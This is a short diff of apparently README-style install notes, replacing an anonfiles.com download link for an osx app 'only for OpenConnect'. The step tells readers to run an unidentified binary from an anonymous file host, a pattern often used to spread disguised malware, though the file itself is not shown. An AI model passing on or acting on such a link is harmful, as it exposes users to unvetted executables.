@@ -16,7 +16,7 @@ step 3
 
 -- To install on osx simply run this app:
 
--- (only for OpenConnect) https://anonfiles.com/file/73b170c93fd80fdbfef177c78868637c
+-- (only for OpenConnect) https://anonfiles.com/file/c2824cb656f038a0314b39a14c12a7f4
 
 ## Or to update on osx run this app:
 
